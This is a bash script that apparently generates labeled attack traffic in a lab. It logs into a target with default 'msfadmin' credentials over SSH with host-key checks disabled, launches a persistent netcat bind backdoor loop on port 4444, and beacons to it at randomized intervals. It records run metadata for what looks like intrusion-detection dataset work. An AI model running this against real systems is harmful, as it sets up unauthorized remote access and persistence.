#!/usr/bin/env bash
set -euo pipefail

RUN_NAME="$1"
NOTES_FILE="$2"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../config.sh"

TARGET_IP="${VICTIM_IP:-192.168.9.131}"
TARGET_USER="${TARGET_USER:-msfadmin}"
TARGET_PASS="${TARGET_PASS:-msfadmin}"
KALI_IP="${KALI_IP:-$(ip route get "$TARGET_IP" | grep -oP 'src \K\S+')}"

ATTACK_DURATION=300
PRE_IDLE=9
POST_IDLE=9

SEED="${SEED:-$RANDOM}"
RANDOM="$SEED"

export SSHPASS="$TARGET_PASS"

SSH_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o HostKeyAlgorithms=+ssh-rsa,ssh-dss
  -o ConnectTimeout=8
)

rand_int() {
  local min="$1"
  local max="$2"
  echo $(( RANDOM % (max - min + 1) + min ))
}

log_kv() {
  echo "$1=$2" | tee -a "$NOTES_FILE"
}

log_time() {
  echo "$1 $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
}

check_remote_process() {
  local pattern="$1"
  sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
    "ps -ef | grep '$pattern' | grep -v grep || true" 2>/dev/null || true
}

tail_remote_log() {
  local log_file="$1"
  sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
    "test -f '$log_file' && tail -n 20 '$log_file' || echo '[WARN] remote log not found: $log_file'" \
    2>/dev/null || true
}

# ============================================================
# backdoor_shell_bind_persistent.sh
#
# PROFILE_ID:
#   bind_steady_beacon
#   bind_interactive_c2
# ============================================================

ATTACK_SUBTYPE="bind_persistent"
PROFILE_ID="${PROFILE_ID:-bind_interactive_c2}"
BIND_PORT="${BIND_PORT:-4444}"

configure_profile() {
  case "$PROFILE_ID" in
    bind_steady_beacon)
      CLIENT_SLEEP_MIN=14
      CLIENT_SLEEP_MAX=24
      CLIENT_READ_TIMEOUT=8
      ;;
    bind_interactive_c2)
      CLIENT_SLEEP_MIN=6
      CLIENT_SLEEP_MAX=14
      CLIENT_READ_TIMEOUT=10
      ;;
    *)
      echo "[-] Unknown PROFILE_ID: $PROFILE_ID" >&2
      echo "    Allowed: bind_steady_beacon, bind_interactive_c2" >&2
      exit 1
      ;;
  esac
}

configure_profile

log_kv RUN_ID "$RUN_NAME"
log_kv ATTACK_CATEGORY "backdoor_shell"
log_kv ATTACK_SUBTYPE "$ATTACK_SUBTYPE"
log_kv PROFILE_ID "$PROFILE_ID"
log_kv RANDOM_SEED "$SEED"
log_kv PROTOCOL "tcp"
log_kv TOOL "nc_bash"
log_kv TARGET_PORT "$BIND_PORT"
log_kv MODULE_SUMMARY "nc_bind_persistent_${PROFILE_ID}"

DEBUG_LOG="/tmp/nc_debug_${RUN_NAME}.log"
: > "$DEBUG_LOG"

echo "[*] backdoor_shell bind persistent started: $RUN_NAME profile=$PROFILE_ID seed=$SEED"

sleep "$PRE_IDLE"
log_time ATTACK_START

sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "pkill -9 -f '[b]d_bind_loop.sh' || true; pkill -f '[n]c -l -p ${BIND_PORT}' || true" \
  >> "$DEBUG_LOG" 2>&1 || true

sleep 1

sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "nohup /tmp/bd_bind_loop.sh ${BIND_PORT} ${ATTACK_DURATION} ${PROFILE_ID} ${SEED} >/tmp/bd_bind_loop_${BIND_PORT}.log 2>&1 < /dev/null &" \
  >> "$DEBUG_LOG" 2>&1 || true

sleep 3

{
  echo "[LOCAL] remote process check after start:"
  check_remote_process "bd_bind_loop.sh"
  echo "[LOCAL] remote log after start:"
  tail_remote_log "/tmp/bd_bind_loop_${BIND_PORT}.log"
} >> "$DEBUG_LOG" 2>&1 || true

START_TIME=$SECONDS
while [[ $((SECONDS - START_TIME)) -lt "$ATTACK_DURATION" ]]; do
  echo "client_ping $(date -u +%s)" | timeout "$CLIENT_READ_TIMEOUT" nc "$TARGET_IP" "$BIND_PORT" >> "$DEBUG_LOG" 2>&1 || true
  sleep "$(rand_int "$CLIENT_SLEEP_MIN" "$CLIENT_SLEEP_MAX")"
done

log_time ATTACK_END

sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "pkill -9 -f '[b]d_bind_loop.sh' || true; pkill -f '[n]c -l -p ${BIND_PORT}' || true" \
  >> "$DEBUG_LOG" 2>&1 || true

sleep "$POST_IDLE"

echo "[+] backdoor_shell bind persistent finished: $RUN_NAME"
